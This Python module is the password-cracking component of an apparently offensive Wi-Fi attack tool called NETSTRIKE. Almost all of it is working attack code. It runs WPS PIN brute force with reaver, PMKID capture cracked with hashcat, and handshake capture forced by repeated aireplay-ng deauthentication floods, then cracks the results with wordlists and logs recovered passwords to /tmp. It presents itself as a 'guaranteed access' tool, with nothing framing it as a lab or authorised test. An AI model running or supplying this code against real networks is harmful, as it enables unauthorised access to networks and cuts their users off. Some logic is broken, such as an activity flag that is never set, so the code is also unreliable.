#!/usr/bin/env python3
"""
NETSTRIKE v3.0 PASSWORD CRACKER
Intelligent Multi-Method Password Extraction
"""

import os
import time
import threading
import subprocess
from ui_animations import CyberUI

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.ui = CyberUI()
        self.cracking_active = False
        self.cracked_passwords = {}
        
    def execute_password_attack(self):
        """Execute intelligent password cracking"""
        self.ui.attack_header("PASSWORD CRACKING")
        self.ui.type_effect("🔓 INITIATING GUARANTEED ACCESS ATTACK...", 0.03)
        
        # Scan for networks
        if not self.scanner.deep_network_scan(10):
            return False
            
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        
        if not target:
            return False
            
        return self._intelligent_cracking_sequence(target)
        
    def _intelligent_cracking_sequence(self, target):
        """Intelligent cracking sequence with multiple methods"""
        self.ui.type_effect(f"🎯 TARGET ACQUIRED: {target['essid']}", 0.03)
        self.ui.type_effect("🧠 ANALYZING TARGET VULNERABILITIES...", 0.03)
        
        # Analyze target for best attack method
        recommended_method = self._analyze_target(target)
        self.ui.type_effect(f"⚡ RECOMMENDED ATTACK: {recommended_method}", 0.03)
        
        methods = [
            ("WPS PIN ATTACK", self._wps_pin_attack, target),
            ("PMKID CAPTURE", self._pmkid_attack, target),
            ("HANDSHAKE CAPTURE", self._handshake_attack, target),
            ("ADVANCED WORDLIST", self._wordlist_attack, target)
        ]
        
        # Try methods in order of effectiveness
        for method_name, method_func, target in methods:
            if not self.cracking_active:
                break
                
            self.ui.type_effect(f"🔄 TRYING: {method_name}...", 0.02)
            
            if method_func(target):
                self.ui.success_message(f"PASSWORD CRACKED WITH {method_name}!")
                return True
            else:
                self.ui.warning_message(f"{method_name} FAILED - TRYING NEXT METHOD")
                time.sleep(2)
                
        self.ui.error_message("ALL CRACKING METHODS FAILED")
        return False
        
    def _analyze_target(self, target):
        """Analyze target for best attack method"""
        encryption = target['encryption'].upper()
        
        if "WEP" in encryption:
            return "WEP CRACKING"
        elif "WPA" in encryption:
            # Check if WPS might be available
            return "WPS PIN ATTACK"
        else:
            return "HANDSHAKE CAPTURE"
            
    def _wps_pin_attack(self, target):
        """WPS PIN attack"""
        self.ui.type_effect("📡 SCANNING FOR WPS VULNERABILITY...", 0.02)
        
        # Check WPS with wash
        wash_cmd = f"timeout 20s wash -i {self.core.mon_interface} -s"
        result = self.core.run_command(wash_cmd)
        
        if result and target['bssid'] in result.stdout:
            self.ui.type_effect("✅ WPS VULNERABILITY DETECTED!", 0.02)
            self.ui.type_effect("💣 LAUNCHING WPS PIN BRUTE FORCE...", 0.02)
            
            # Start reaver attack
            reaver_cmd = f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A"
            reaver_proc = self.core.run_command(reaver_cmd, background=True)
            
            if reaver_proc:
                self.core.add_attack_process(reaver_proc)
                self.ui.type_effect("⚡ WPS ATTACK RUNNING IN BACKGROUND...", 0.02)
                self.ui.type_effect("📝 CHECK TERMINAL FOR PIN PROGRESS", 0.02)
                return True
        else:
            self.ui.warning_message("WPS NOT AVAILABLE ON TARGET")
            
        return False
        
    def _pmkid_attack(self, target):
        """PMKID attack without handshake"""
        self.ui.type_effect("🔍 ATTEMPTING PMKID CAPTURE...", 0.02)
        
        pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
        
        # Capture PMKID
        capture_cmd = f"timeout 30s hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2"
        result = self.core.run_command(capture_cmd)
        
        if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
            self.ui.type_effect("✅ PMKID CAPTURED SUCCESSFULLY!", 0.02)
            
            # Convert to hash format
            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng"
            self.core.run_command(convert_cmd)
            
            if os.path.exists(f"{pmkid_file}.hash"):
                return self._crack_pmkid_hash(f"{pmkid_file}.hash", target)
                
        self.ui.warning_message("PMKID CAPTURE FAILED")
        return False
        
    def _crack_pmkid_hash(self, hash_file, target):
        """Crack PMKID hash"""
        wordlist = self._get_wordlist()
        
        if wordlist:
            self.ui.type_effect("🔓 CRACKING PMKID HASH...", 0.02)
            
            crack_cmd = f"hashcat -m 16800 {hash_file} {wordlist} -O --force"
            result = self.core.run_command(crack_cmd)
            
            if result and "Cracked" in result.stdout:
                # Extract password
                lines = result.stdout.split('\n')
                for line in lines:
                    if "Cracked" in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        self._save_cracked_password(target, password)
                        return True
                        
        return False
        
    def _handshake_attack(self, target):
        """Handshake capture and cracking"""
        self.ui.type_effect("🤝 ATTEMPTING HANDSHAKE CAPTURE...", 0.02)
        
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Start capture
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface}",
            background=True
        )
        
        # Aggressive deauth to trigger handshake
        self.ui.type_effect("💣 DEPLOYING AGGRESSIVE DEAUTH...", 0.02)
        deauth_thread = threading.Thread(target=self._aggressive_deauth, args=(target,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Wait for handshake
        self.ui.progress_bar("CAPTURING HANDSHAKE", 45)
        
        if capture_proc:
            capture_proc.terminate()
            
        # Check for handshake
        cap_path = f"{cap_file}-01.cap"
        if self._check_handshake(cap_path):
            self.ui.type_effect("✅ HANDSHAKE CAPTURED SUCCESSFULLY!", 0.02)
            return self._smart_crack_handshake(cap_path, target)
        else:
            self.ui.warning_message("NO HANDSHAKE CAPTURED")
            return False
            
    def _aggressive_deauth(self, target):
        """Aggressive deauth attacks"""
        for i in range(15):
            if not self.cracking_active:
                break
            self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
            time.sleep(2)
            
    def _check_handshake(self, cap_file):
        """Check if handshake was captured"""
        if not os.path.exists(cap_file):
            return False
            
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
        return result and "1 handshake" in result.stdout
        
    def _smart_crack_handshake(self, cap_file, target):
        """Smart handshake cracking with multiple wordlists"""
        self.ui.type_effect("🧠 INITIATING SMART CRACKING SEQUENCE...", 0.02)
        
        wordlists = self._get_all_wordlists()
        
        for wl_name, wl_path in wordlists.items():
            if wl_path and os.path.exists(wl_path):
                self.ui.type_effect(f"🔓 TRYING {wl_name}...", 0.02)
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wl_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q"
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    self._save_cracked_password(target, password)
                    return True
                    
        return False
        
    def _wordlist_attack(self, target):
        """Advanced wordlist attack"""
        self.ui.type_effect("📚 DEPLOYING ADVANCED WORDLIST ATTACK...", 0.02)
        
        # Create targeted wordlist based on SSID
        smart_wordlist = self._create_smart_wordlist(target['essid'])
        
        if smart_wordlist:
            self.ui.type_effect("🎯 USING INTELLIGENT WORDLIST...", 0.02)
            # This would integrate with handshake cracking
            return False
            
        return False
        
    def _get_wordlist(self):
        """Get available wordlist"""
        wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/netstrike_passwords.txt",
            "/tmp/top_million.txt"
        ]
        
        for wl in wordlists:
            if os.path.exists(wl):
                return wl
                
        return None
        
    def _get_all_wordlists(self):
        """Get all available wordlists"""
        return {
            "Targeted Wordlist": self._create_smart_wordlist(""),
            "RockYou Wordlist": "/usr/share/wordlists/rockyou.txt",
            "Common Passwords": "/usr/share/wordlists/netstrike_passwords.txt"
        }
        
    def _create_smart_wordlist(self, essid):
        """Create intelligent targeted wordlist"""
        wordlist_path = "/tmp/netstrike_smart_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty",
            "123456789", "password123", "admin", "welcome123", "1234567890",
            "1234", "12345", "123456", "1234567", "internet", "wireless",
            "default", "guest", "linksys", "dlink", "netgear", "cisco"
        ]
        
        # Add ESSID-based variations
        if essid and essid != "HIDDEN_SSID":
            clean_essid = essid.replace('_', '').replace('-', '').replace(' ', '')
            variations = [
                essid, essid + "123", essid + "1234", essid.lower(),
                essid.upper(), clean_essid, clean_essid + "123"
            ]
            common_passwords.extend(variations)
            
        try:
            with open(wordlist_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
            return wordlist_path
        except:
            return None
            
    def _save_cracked_password(self, target, password):
        """Save cracked password"""
        target_key = f"{target['essid']}_{target['bssid']}"
        self.cracked_passwords[target_key] = password
        
        self.ui.success_message(f"🎉 PASSWORD CRACKED: {password}")
        
        # Save to file
        with open("/tmp/netstrike_cracked.txt", "a") as f:
            f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
